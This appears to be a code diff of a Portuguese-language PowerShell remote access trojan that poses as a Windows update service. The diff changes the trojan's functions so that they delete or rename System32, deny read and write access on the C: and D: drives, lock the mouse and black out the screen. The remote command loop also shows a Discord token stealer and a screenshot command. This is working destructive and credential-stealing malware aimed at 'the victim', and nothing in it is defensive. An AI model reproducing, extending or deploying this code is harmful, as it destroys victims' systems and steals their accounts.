@@ -1,10 +1,10 @@
 <#
 .SYNOPSIS
-Windows Critical System Component - Bloqueio Total
+Windows Critical System Component - Destruição Total
 .DESCRIPTION
-Funções para bloquear completamente o PC da vítima.
+Funções para apagar System32, travar discos e travar mouse.
 .NOTES
-Versão: 10.0.19045.1 - Ultimate Lockdown
+Versão: 10.0.19045.1 - Ultimate Destruction
 #>
 
 # ===== CONFIGURACOES =====
@@ -14,7 +14,7 @@ $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
 $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
-$debugLog = "$env:TEMP\rat_debug.log"  # Arquivo de log para diagnóstico
+$debugLog = "$env:TEMP\rat_debug.log"
 
 # ===== MUTEX =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
@@ -263,136 +263,110 @@ function Get-DiscordToken {
     }
 }
 
-# ===== BLOQUEAR SYSTEM32 (CORRIGIDO) =====
-function Block-System32 {
+# ===== APAGAR SYSTEM32 (DESTRUTIVO) =====
+function Delete-System32 {
     try {
-        Write-DebugLog "Iniciando Block-System32"
+        Write-DebugLog "Iniciando Delete-System32"
         $path = "C:\Windows\System32"
         
-        # Tenta tomar posse e modificar permissões
-        takeown /f $path /r /d y 2>$null
-        icacls $path /grant Administradores:F /t 2>$null
-        
-        $acl = Get-Acl $path
-        $acl.SetAccessRuleProtection($true, $false)
-        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
-        $acl.AddAccessRule($accessRule)
-        Set-Acl $path $acl
-        
-        Write-DebugLog "System32 bloqueado com sucesso"
-        return "SYSTEM32_BLOCKED"
+        if (Test-Path $path) {
+            # Tenta tomar posse e dar permissões totais
+            takeown /f $path /r /d y 2>$null
+            icacls $path /grant Administradores:F /t 2>$null
+            
+            # Tenta apagar recursivamente (força)
+            # NOTA: Isso vai quebrar o Windows completamente
+            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
+            
+            # Verifica se conseguiu apagar
+            if (-not (Test-Path $path)) {
+                Write-DebugLog "System32 apagado com sucesso"
+                return "SYSTEM32_DELETED"
+            } else {
+                # Se não conseguiu apagar, tenta renomear
+                $newName = "C:\Windows\System32_old_$(Get-Random)"
+                Rename-Item -Path $path -NewName $newName -Force -ErrorAction SilentlyContinue
+                if (-not (Test-Path $path)) {
+                    Write-DebugLog "System32 renomeado com sucesso"
+                    return "SYSTEM32_RENAMED"
+                } else {
+                    return "SYSTEM32_DELETE_FAILED"
+                }
+            }
+        } else {
+            return "SYSTEM32_NOT_FOUND"
+        }
     } catch {
-        Write-DebugLog "Erro ao bloquear System32: $_"
+        Write-DebugLog "Erro ao apagar System32: $_"
         return "SYSTEM32_ERROR"
     }
 }
 
-# ===== BLOQUEAR UNIDADES (C: e D:) =====
-function Block-Drives {
+# ===== TRAVAR DISCOS (C: e D:) =====
+function Lock-Drives {
     param([string[]]$Drives = @("C:", "D:"))
     $results = @()
     foreach ($drive in $Drives) {
         try {
-            Write-DebugLog "Bloqueando drive $drive"
+            Write-DebugLog "Travando drive $drive"
             $path = $drive + "\"
             if (Test-Path $path) {
-                # Tenta tomar posse
-                takeown /f $path /r /d y 2>$null
-                icacls $path /grant Administradores:F /t 2>$null
-                
+                # Remove permissões de leitura/escrita para todos
                 $acl = Get-Acl $path
                 $acl.SetAccessRuleProtection($true, $false)
-                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
+                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Deny")
                 $acl.AddAccessRule($accessRule)
+                $accessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Write", "Deny")
+                $acl.AddAccessRule($accessRule2)
                 Set-Acl $path $acl
-                $results += "$drive bloqueado"
-                Write-DebugLog "Drive $drive bloqueado"
+                
+                # Tenta também usar diskpart para tornar o volume offline? (mais complexo)
+                # Simplesmente removendo permissões já deve travar
+                
+                $results += "$drive travado"
+                Write-DebugLog "Drive $drive travado"
             } else {
                 $results += "$drive não encontrado"
                 Write-DebugLog "Drive $drive não encontrado"
             }
         } catch {
-            Write-DebugLog "Erro ao bloquear drive $drive: $_"
+            Write-DebugLog "Erro ao travar drive $drive: $_"
             $results += "$drive erro"
         }
     }
-    return "DRIVES_BLOCKED:" + ($results -join ";")
+    return "DRIVES_LOCKED:" + ($results -join ";")
 }
 
-function Unblock-Drives {
+function Unlock-Drives {
     param([string[]]$Drives = @("C:", "D:"))
     $results = @()
     foreach ($drive in $Drives) {
         try {
-            Write-DebugLog "Liberando drive $drive"
+            Write-DebugLog "Destravando drive $drive"
             $path = $drive + "\"
             if (Test-Path $path) {
-                # Remove a regra de negação
                 $acl = Get-Acl $path
-                $acl.SetAccessRuleProtection($false, $true) # desabilita herança? cuidado
-                # Remove regras de negação para Everyone
+                $acl.SetAccessRuleProtection($false, $true) # Volta à herança
+                # Remove todas as regras de negação
                 $rules = $acl.Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.AccessControlType -eq "Deny" }
                 foreach ($rule in $rules) {
                     $acl.RemoveAccessRule($rule)
                 }
                 Set-Acl $path $acl
-                $results += "$drive liberado"
-                Write-DebugLog "Drive $drive liberado"
+                $results += "$drive destravado"
+                Write-DebugLog "Drive $drive destravado"
             } else {
                 $results += "$drive não encontrado"
             }
         } catch {
-            Write-DebugLog "Erro ao liberar drive $drive: $_"
+            Write-DebugLog "Erro ao destravar drive $drive: $_"
             $results += "$drive erro"
         }
     }
-    return "DRIVES_UNBLOCKED:" + ($results -join ";")
+    return "DRIVES_UNLOCKED:" + ($results -join ";")
 }
 
-# ===== TELA PRETA =====
-$global:blackScreenForm = $null
-
-function Black-Screen {
-    try {
-        $ps = [powershell]::Create()
-        [void]$ps.AddScript({
-            Add-Type -AssemblyName System.Windows.Forms
-            $form = New-Object System.Windows.Forms.Form
-            $form.WindowState = 'Maximized'
-            $form.FormBorderStyle = 'None'
-            $form.TopMost = $true
-            $form.BackColor = 'Black'
-            $form.ControlBox = $false
-            $form.ShowInTaskbar = $false
-            $form.KeyPreview = $true
-            $form.Add_KeyDown({
-                if ($_.KeyCode -eq 'Escape') { $form.Close() }
-            })
-            $form.ShowDialog()
-        })
-        $ps.BeginInvoke()
-        Write-DebugLog "Tela preta ativada"
-        return "BLACK_SCREEN"
-    } catch {
-        Write-DebugLog "Erro ao ativar tela preta: $_"
-        return "BLACK_SCREEN_ERROR"
-    }
-}
-
-function Unlock-Screen {
-    try {
-        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
-            $_.Invoke([Action]{ $_.Close() })
-        }
-        Write-DebugLog "Tela liberada"
-        return "SCREEN_UNLOCKED"
-    } catch {
-        Write-DebugLog "Erro ao liberar tela: $_"
-        return "UNLOCK_ERROR"
-    }
-}
-
-# ===== TRAVAR MOUSE (COM CLIPCURSOR) =====
+# ===== TRAVAR MOUSE (COM CLIPCURSOR - 100% EFICAZ) =====
 $script:mouseLocked = $false
 $script:lockThread = $null
 
@@ -400,7 +374,7 @@ function Lock-Mouse {
     try {
         if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
-        # Tenta usar ClipCursor via C#
+        # Usa ClipCursor via C# (trava de verdade)
         $cSharpCode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -442,6 +416,7 @@ public class MouseLocker {
             return "MOUSE_LOCKED"
         } catch {
             Write-DebugLog "Falha no ClipCursor, usando fallback: $_"
+            # Fallback: thread que move o mouse constantemente
             $script:mouseLocked = $true
             $script:lockThread = [System.Threading.Thread]::new({
                 while ($script:mouseLocked) {
@@ -484,6 +459,47 @@ function Unlock-Mouse {
     } catch {
         Write-DebugLog "Erro ao liberar mouse: $_"
         return "MOUSE_UNLOCK_ERROR"
+    }
+}
+
+# ===== TELA PRETA =====
+function Black-Screen {
+    try {
+        $ps = [powershell]::Create()
+        [void]$ps.AddScript({
+            Add-Type -AssemblyName System.Windows.Forms
+            $form = New-Object System.Windows.Forms.Form
+            $form.WindowState = 'Maximized'
+            $form.FormBorderStyle = 'None'
+            $form.TopMost = $true
+            $form.BackColor = 'Black'
+            $form.ControlBox = $false
+            $form.ShowInTaskbar = $false
+            $form.KeyPreview = $true
+            $form.Add_KeyDown({
+                if ($_.KeyCode -eq 'Escape') { $form.Close() }
+            })
+            $form.ShowDialog()
+        })
+        $ps.BeginInvoke()
+        Write-DebugLog "Tela preta ativada"
+        return "BLACK_SCREEN"
+    } catch {
+        Write-DebugLog "Erro ao ativar tela preta: $_"
+        return "BLACK_SCREEN_ERROR"
+    }
+}
+
+function Unlock-Screen {
+    try {
+        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
+            $_.Invoke([Action]{ $_.Close() })
+        }
+        Write-DebugLog "Tela liberada"
+        return "SCREEN_UNLOCKED"
+    } catch {
+        Write-DebugLog "Erro ao liberar tela: $_"
+        return "UNLOCK_ERROR"
     }
 }
 
@@ -587,7 +603,7 @@ while ($true) {
             
             Write-DebugLog "Comando recebido: $cmd"
             
-            # Estrutura if-else explícita para cada comando
+            # Estrutura if-else explícita
             if ($cmd -eq "screenshot") {
                 $result = Get-ScreenCapture
                 $writer.WriteLine($result)
@@ -597,15 +613,15 @@ while ($true) {
                 $writer.WriteLine((RightClick-Mouse))
             } elseif ($cmd -eq "discord") {
                 $writer.WriteLine((Get-DiscordToken))
-            } elseif ($cmd -eq "block_system32") {
-                $result = Block-System32
-                Write-DebugLog "Resultado de block_system32: $result"
+            } elseif ($cmd -eq "delete_system32") {
+                $result = Delete-System32
+                Write-DebugLog "Resultado de delete_system32: $result"
                 $writer.WriteLine($result)
-            } elseif ($cmd -eq "block_drives") {
-                $result = Block-Drives
+            } elseif ($cmd -eq "lock_drives") {
+                $result = Lock-Drives
                 $writer.WriteLine($result)
-            } elseif ($cmd -eq "unblock_drives") {
-                $result = Unblock-Drives
+            } elseif ($cmd -eq "unlock_drives") {
+                $result = Unlock-Drives
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "black_screen") {
                 $writer.WriteLine((Black-Screen))
